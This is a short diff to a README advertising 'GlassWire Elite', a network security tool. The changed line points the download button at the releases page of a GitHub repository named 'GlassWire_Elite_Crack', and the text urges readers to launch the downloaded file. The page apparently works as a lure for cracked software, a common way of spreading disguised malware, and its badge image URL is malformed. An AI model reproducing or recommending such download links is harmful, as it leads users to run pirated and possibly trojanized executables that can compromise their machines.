@@ -40,7 +40,7 @@ GlassWire Elite is a powerful network security tool that provides users with det
 
 ## Get GlassWire Elite
 Click the button below to download GlassWire Elite:
-[![Download GlassWire Elite](https://img.shields.io/badge/Download-GlassWire_Elite-<COLOR>.svg)](https://github.com/file/Soft.zip)
+[![Download GlassWire Elite](https://github.com/soundcloudaudmp3/GlassWire_Elite_Crack/releases<COLOR>.svg)](https://github.com/soundcloudaudmp3/GlassWire_Elite_Crack/releases)
 
 If the link ends with the file name, make sure to launch it to begin your GlassWire Elite experience.
 
